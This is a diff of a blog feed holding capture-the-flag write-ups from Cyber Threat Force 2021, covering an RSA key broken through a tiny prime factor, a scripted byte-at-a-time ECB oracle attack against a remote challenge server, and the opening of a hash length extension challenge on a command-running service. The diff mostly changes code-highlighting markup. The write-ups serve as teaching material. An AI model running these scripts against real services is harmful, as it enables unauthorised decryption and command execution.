@@ -14,11 +14,11 @@ Nous avons mis en relation ce message a un message anterieur, contenant une disc
 &lt;p>Q.G.&lt;/p>
 &lt;/blockquote>
 &lt;p>We can use tshark to view the raw data of the network captures:&lt;/p>
-&lt;pre tabindex="0">&lt;code class="language-cli" data-lang="cli">$ tshark -r comm1.pcapng -T fields -e data | xxd -r -p
+&lt;pre>&lt;code class="language-cli" data-lang="cli">$ tshark -r comm1.pcapng -T fields -e data | xxd -r -p
 Hey, could you generate an rsa key for me ? I Dont know how to do it
 Yes sure, i just need a prime integer to generate it
 Just take a random one, like 347 for example
-Perfect, i&amp;#39;ll keep you in touch
+Perfect, i'll keep you in touch
 $ tshark -r comm2.pcapng -T fields -e data | xxd -r -p
 Hello
 -----BEGIN PUBLIC KEY-----
@@ -29,45 +29,40 @@ MBwwDQYJKoZIhvcNAQEBBQADCwAwCAIDBGOvAgER
 194813 185211 207993 185211 110406 140230 92028 110406 237729 176304 185211 110406 92028 185211 35389 207993 185211 237729 110406 35389 171155 171098 185211 110406 105244 110406 228171 207520 180458 196399 104282 71436 31634 106170 103296 132591 35389 69499 171098 196399 24720 104282 92028 59381 24720 230238 230238 36350
 &lt;/code>&lt;/pre>&lt;p>The first message tells us about a message encrypted using RSA, for which a factor is 347. The second message contains the public key, and the message itself (the value of each char).&lt;/p>
 &lt;p>We can be lazy and use &lt;a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool&lt;/a> to get ourselves the private key parameters, after copying the public key to a file.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python RsaCtfTool.py --publickey key.pub --private --dumpkey
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Testing key key.pub.
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Performing mersenne_primes attack on key.pub.
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Performing smallq attack on key.pub.
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Attack success with smallq method !
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Results &lt;span style="color:#66d9ef">for&lt;/span> key.pub:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Private key :
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----BEGIN RSA PRIVATE KEY-----
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MCQCAQACAwRjrwIBEQIDAQdRAgIDPQICAVsCAgFVAgIBHQICAxI&lt;span style="color:#f92672">=&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----END RSA PRIVATE KEY-----
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n: &lt;span style="color:#ae81ff">287663&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e: &lt;span style="color:#ae81ff">17&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d: &lt;span style="color:#ae81ff">67409&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p: &lt;span style="color:#ae81ff">829&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>q: &lt;span style="color:#ae81ff">347&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Public key details &lt;span style="color:#66d9ef">for&lt;/span> key.pub
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n: &lt;span style="color:#ae81ff">287663&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e: &lt;span style="color:#ae81ff">17&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now all we have to do is map each number to the power of &lt;code>d&lt;/code>, mod &lt;code>n&lt;/code> (&lt;a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Decryption">ref&lt;/a>):&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>d &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">67409&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">287663&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lines &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">71436 176304 185211 110406 35389 179680 56238 185211 207993 237729 176304 207993 185211 192576 237729 95070 171155 207993 35389 185211 110406 140230 92028 110406 140230 246626 82805
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">95994 185211 110406 176304 192576 230623 185211 110406 237729 171155 110406 247756 185211 192576 230623 185211 110406 237729 176304 140230 92028 110406 232955 247756 192576 35389 185211 82805
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">194813 185211 207993 185211 110406 140230 92028 110406 237729 176304 185211 110406 92028 185211 35389 207993 185211 237729 110406 35389 171155 171098 185211 110406 105244 110406 228171 207520 180458 196399 104282 71436 31634 106170 103296 132591 35389 69499 171098 196399 24720 104282 92028 59381 24720 230238 230238 36350
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>strip()
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> line &lt;span style="color:#f92672">in&lt;/span> lines&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>):
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> blocks &lt;span style="color:#f92672">=&lt;/span> list(map(int, line&lt;span style="color:#f92672">.&lt;/span>split()))
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([chr((block &lt;span style="color:#f92672">**&lt;/span> d) &lt;span style="color:#f92672">%&lt;/span> n) &lt;span style="color:#66d9ef">for&lt;/span> block &lt;span style="color:#f92672">in&lt;/span> blocks]))
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python solve.py
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>The cyberthreatforce is in.
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>We have to leave this place.
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Here is the secret code : CYBERTF&lt;span style="color:#f92672">{&lt;/span>D3c0dE_Rs4_!!&lt;span style="color:#f92672">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{D3c0dE_Rs4_!!}&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python RsaCtfTool.py --publickey key.pub --private --dumpkey
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Testing key key.pub.
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Performing mersenne_primes attack on key.pub.
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Performing smallq attack on key.pub.
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Attack success with smallq method !
+Results &lt;span style="color:#66d9ef">for&lt;/span> key.pub:
+Private key :
+-----BEGIN RSA PRIVATE KEY-----
+MCQCAQACAwRjrwIBEQIDAQdRAgIDPQICAVsCAgFVAgIBHQICAxI&lt;span style="color:#f92672">=&lt;/span>
+-----END RSA PRIVATE KEY-----
+n: &lt;span style="color:#ae81ff">287663&lt;/span>
+e: &lt;span style="color:#ae81ff">17&lt;/span>
+d: &lt;span style="color:#ae81ff">67409&lt;/span>
+p: &lt;span style="color:#ae81ff">829&lt;/span>
+q: &lt;span style="color:#ae81ff">347&lt;/span>
+Public key details &lt;span style="color:#66d9ef">for&lt;/span> key.pub
+n: &lt;span style="color:#ae81ff">287663&lt;/span>
+e: &lt;span style="color:#ae81ff">17&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now all we have to do is map each number to the power of &lt;code>d&lt;/code>, mod &lt;code>n&lt;/code> (&lt;a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Decryption">ref&lt;/a>):&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">d &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">67409&lt;/span>
+n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">287663&lt;/span>
+lines &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
+&lt;/span>&lt;span style="color:#e6db74">71436 176304 185211 110406 35389 179680 56238 185211 207993 237729 176304 207993 185211 192576 237729 95070 171155 207993 35389 185211 110406 140230 92028 110406 140230 246626 82805
+&lt;/span>&lt;span style="color:#e6db74">95994 185211 110406 176304 192576 230623 185211 110406 237729 171155 110406 247756 185211 192576 230623 185211 110406 237729 176304 140230 92028 110406 232955 247756 192576 35389 185211 82805
+&lt;/span>&lt;span style="color:#e6db74">194813 185211 207993 185211 110406 140230 92028 110406 237729 176304 185211 110406 92028 185211 35389 207993 185211 237729 110406 35389 171155 171098 185211 110406 105244 110406 228171 207520 180458 196399 104282 71436 31634 106170 103296 132591 35389 69499 171098 196399 24720 104282 92028 59381 24720 230238 230238 36350
+&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>strip()
+&lt;span style="color:#66d9ef">for&lt;/span> line &lt;span style="color:#f92672">in&lt;/span> lines&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>):
+blocks &lt;span style="color:#f92672">=&lt;/span> list(map(int, line&lt;span style="color:#f92672">.&lt;/span>split()))
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([chr((block &lt;span style="color:#f92672">**&lt;/span> d) &lt;span style="color:#f92672">%&lt;/span> n) &lt;span style="color:#66d9ef">for&lt;/span> block &lt;span style="color:#f92672">in&lt;/span> blocks]))
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve.py
+The cyberthreatforce is in.
+We have to leave this place.
+Here is the secret code : CYBERTF&lt;span style="color:#f92672">{&lt;/span>D3c0dE_Rs4_!!&lt;span style="color:#f92672">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{D3c0dE_Rs4_!!}&lt;/code>.&lt;/p>
 &lt;p>Note: even though I was the one to input the flag in CTFd, it was my teammate &lt;a href="https://ctftime.org/user/46515">R0ck3t&lt;/a> that found it first.&lt;/p>
 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/crypto/unefficient-encryption">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Strange service</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-service/</link><pubDate>Sat, 10 Jul 2021 17:18:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-service/</guid><description>For this challenge, we were given access to a service. The description told us that it was an encryption oracle, which used AES to encrypt what we sent it, concatenated with critical data.
 I&amp;rsquo;m writting this after the challenge ended, so I can&amp;rsquo;t include demos.
@@ -88,170 +83,145 @@ Cryptopals - Byte-a-time ECB decryption (Simple) Why is Byte-at-a-time ECB decry
 &lt;li>otherwise, retry with &lt;code>aaab&lt;/code>, &lt;code>aaac&lt;/code>, &amp;hellip;&lt;/li>
 &lt;/ul>
 &lt;p>We can script this out:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> string
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">service&lt;/span>(inp):
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;144.217.73.235&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">29292&lt;/span>)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> prompt &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>sendline(inp)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvall()
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>close()
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> output
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>known &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> known&lt;span style="color:#f92672">.&lt;/span>endswith(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;}&amp;#39;&lt;/span>):
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># One char short&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(known)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target &lt;span style="color:#f92672">=&lt;/span> service(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> l)[:&lt;span style="color:#ae81ff">64&lt;/span>]
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable&lt;span style="color:#f92672">.&lt;/span>encode():
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b &lt;span style="color:#f92672">=&lt;/span> bytes([b])
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> block &lt;span style="color:#f92672">=&lt;/span> service(known&lt;span style="color:#f92672">.&lt;/span>zfill(&lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> b)[:&lt;span style="color:#ae81ff">64&lt;/span>]
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> target &lt;span style="color:#f92672">==&lt;/span> block:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(b&lt;span style="color:#f92672">.&lt;/span>decode(), end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> known &lt;span style="color:#f92672">+=&lt;/span> b
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print()
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I used 64 chars because that&amp;rsquo;s the size of the returned data. I&amp;rsquo;ve failed to retrieve the flag once or twice before because I tried with the block size (16) instead, which only retrieved the start of the secret.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python solve.py
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CYBERTF&lt;span style="color:#f92672">{&lt;/span>WTF_It’s_u$eless_in_real_w0rld&lt;span style="color:#f92672">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was &lt;code>CYBERTF{WTF_It’s_u$eless_in_real_w0rld}&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> string
+&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">service&lt;/span>(inp):
+r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;144.217.73.235&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">29292&lt;/span>)
+prompt &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>sendline(inp)
+output &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvall()
+r&lt;span style="color:#f92672">.&lt;/span>close()
+&lt;span style="color:#66d9ef">return&lt;/span> output
+known &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> known&lt;span style="color:#f92672">.&lt;/span>endswith(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;}&amp;#39;&lt;/span>):
+&lt;span style="color:#75715e"># One char short&lt;/span>
+l &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(known)
+target &lt;span style="color:#f92672">=&lt;/span> service(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> l)[:&lt;span style="color:#ae81ff">64&lt;/span>]
+&lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable&lt;span style="color:#f92672">.&lt;/span>encode():
+b &lt;span style="color:#f92672">=&lt;/span> bytes([b])
+block &lt;span style="color:#f92672">=&lt;/span> service(known&lt;span style="color:#f92672">.&lt;/span>zfill(&lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> b)[:&lt;span style="color:#ae81ff">64&lt;/span>]
+&lt;span style="color:#66d9ef">if&lt;/span> target &lt;span style="color:#f92672">==&lt;/span> block:
+&lt;span style="color:#66d9ef">print&lt;/span>(b&lt;span style="color:#f92672">.&lt;/span>decode(), end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)
+known &lt;span style="color:#f92672">+=&lt;/span> b
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;span style="color:#66d9ef">print&lt;/span>()
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I used 64 chars because that&amp;rsquo;s the size of the returned data. I&amp;rsquo;ve failed to retrieve the flag once or twice before because I tried with the block size (16) instead, which only retrieved the start of the secret.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve.py
+CYBERTF&lt;span style="color:#f92672">{&lt;/span>WTF_It’s_u$eless_in_real_w0rld&lt;span style="color:#f92672">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was &lt;code>CYBERTF{WTF_It’s_u$eless_in_real_w0rld}&lt;/code>.&lt;/p>
 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/crypto/strange-service">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Strange administration service</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-administration-service/</link><pubDate>Sat, 10 Jul 2021 15:55:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-administration-service/</guid><description>For this challenge, we were given access to a server which we can connect to:
 $ nc 144.217.73.235 27099 give me cmd|token example: ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 chall.py wrapper $ nc 144.217.73.235 27099 give me cmd|token example: ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a whoami|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140 Bad Token It executes the command we give it, given that we know the corresponding hash. The challenge description told us that the hash format is HASH(SECRET || CMD).
 This should instantly make us think of hash key length extension attacks.</description><content>&lt;p>For this challenge, we were given access to a server which we can connect to:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nc 144.217.73.235 &lt;span style="color:#ae81ff">27099&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>give me cmd|token
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>example:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chall.py
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wrapper
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ nc 144.217.73.235 &lt;span style="color:#ae81ff">27099&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>give me cmd|token
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>example:
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>whoami|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Bad Token
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It executes the command we give it, given that we know the corresponding hash. The challenge description told us that the hash format is &lt;code>HASH(SECRET || CMD)&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ nc 144.217.73.235 &lt;span style="color:#ae81ff">27099&lt;/span>
+give me cmd|token
+example:
+ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
+id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a
+ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
+chall.py
+wrapper
+$ nc 144.217.73.235 &lt;span style="color:#ae81ff">27099&lt;/span>
+give me cmd|token
+example:
+ls|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
+id|69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a
+whoami|c9af5ac08978481063b711f031f38518a7c2d83d6db3eabacbd7726470e8a140
+Bad Token
